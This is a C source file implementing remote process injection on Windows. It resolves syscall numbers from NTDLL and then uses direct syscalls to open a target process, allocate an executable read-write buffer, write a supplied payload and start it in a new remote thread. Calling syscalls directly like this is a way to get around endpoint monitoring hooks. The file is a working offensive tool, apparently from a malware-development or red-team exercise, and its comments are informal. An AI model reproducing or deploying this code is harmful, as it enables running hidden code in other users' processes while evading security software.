#include "injection.h"

DWORD GetSyscallNumber(
        _In_ HMODULE NTDLLHandle,
        _In_ LPCSTR NtFunctionName
        ) {

    DWORD    SyscallNumber     = 0;
    UINT_PTR NtFunctionAddress = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NTDLLHandle, NtFunctionName);
    if (NULL == (PVOID)NtFunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return 0;
    }

    SyscallNumber = ((PBYTE)(NtFunctionAddress + 0x4))[0]; 
    printf("[0x%p] [0x%0.3lx] got the address and SSN of %s!", 
            (PVOID)NtFunctionAddress, 
            SyscallNumber,
            NtFunctionName);
    return SyscallNumber;

}

BOOL DirectSyscallsInjection(
        _In_ DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ SIZE_T PayloadSize
        ) {

    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    HMODULE  NTDLLHandle   = NULL;
    PVOID    RemoteBuffer  = NULL;
    SIZE_T   BytesWritten  = 0;
    NTSTATUS STATUS        = 0;
    BOOL     STATE         = TRUE; 

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL  };
    CLIENT_ID CID        = { (HANDLE)PID, NULL };

    if (NULL == Payload || 0 == PayloadSize) {
        printf("payload's not set. exiting...");
        return FALSE;
    }

    printf("initializing globals...");
    NTDLLHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NTDLLHandle) {
        PrettyFormat("GetModuleHandleW", GetLastError());
        return FALSE; 
    }
    printf("[0x%p] got the address of NTDLL", NTDLLHandle);

    g_NtOpenProcessSSN           = GetSyscallNumber(NTDLLHandle, "NtOpenProcess");
    g_NtAllocateVirtualMemorySSN = GetSyscallNumber(NTDLLHandle, "NtAllocateVirtualMemory");
    g_NtWriteVirtualMemorySSN    = GetSyscallNumber(NTDLLHandle, "NtWriteVirtualMemory");
    g_NtCreateThreadExSSN        = GetSyscallNumber(NTDLLHandle, "NtCreateThreadEx");
    g_NtWaitForSingleObjectSSN   = GetSyscallNumber(NTDLLHandle, "NtWaitForSingleObject");
    g_NtCloseSSN                 = GetSyscallNumber(NTDLLHandle, "NtClose");

    printf("attempting to get a handle on the process (%ld)...", PID);
    STATUS = fn_NtOpenProcess(
            &ProcessHandle,
            PROCESS_ALL_ACCESS,
            &OA,
            &CID
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtOpenProcess", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    printf("[0x%p] got a handle on the process (%ld)", ProcessHandle, PID);

    STATUS = fn_NtAllocateVirtualMemory(
            ProcessHandle,
            &RemoteBuffer,
            0,
            &PayloadSize,
            (MEM_COMMIT | MEM_RESERVE),
            PAGE_EXECUTE_READWRITE
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtAllocateVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    printf("[0x%p] [RWX] allocated a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions!", 
            RemoteBuffer, PayloadSize);

    STATUS = fn_NtWriteVirtualMemory(
            ProcessHandle,
            RemoteBuffer,
            Payload,
            PayloadSize,
            &BytesWritten
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtWriteVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    /* r/masterhacker */
    for (SIZE_T i = 0; i <= BytesWritten; i++) {
        printf("\r[>~<] [0x%p] [RWX] [%zu/%zu] writing payload to buffer...",
                RemoteBuffer, i, BytesWritten);
    }
    (VOID)puts("");

    STATUS = fn_NtCreateThreadEx(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            &OA,
            ProcessHandle,
            RemoteBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtCreateThreadEx", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    printf("[0x%p] successfully created a thread! waiting for it to finish execution...", ThreadHandle);

    STATUS = fn_NtWaitForSingleObject(
            ThreadHandle,
            FALSE,
            NULL
            );
    printf("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEAN_UP:

    /* you should look into using NtFreeVirtualMemory
       for cleanup as well for our allocated buffer. */

    if (ThreadHandle) {
        fn_NtClose(ThreadHandle);
        printf("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        fn_NtClose(ProcessHandle);
        printf("[0x%p] handle on process closed", ProcessHandle);
    }

    return STATE;

}
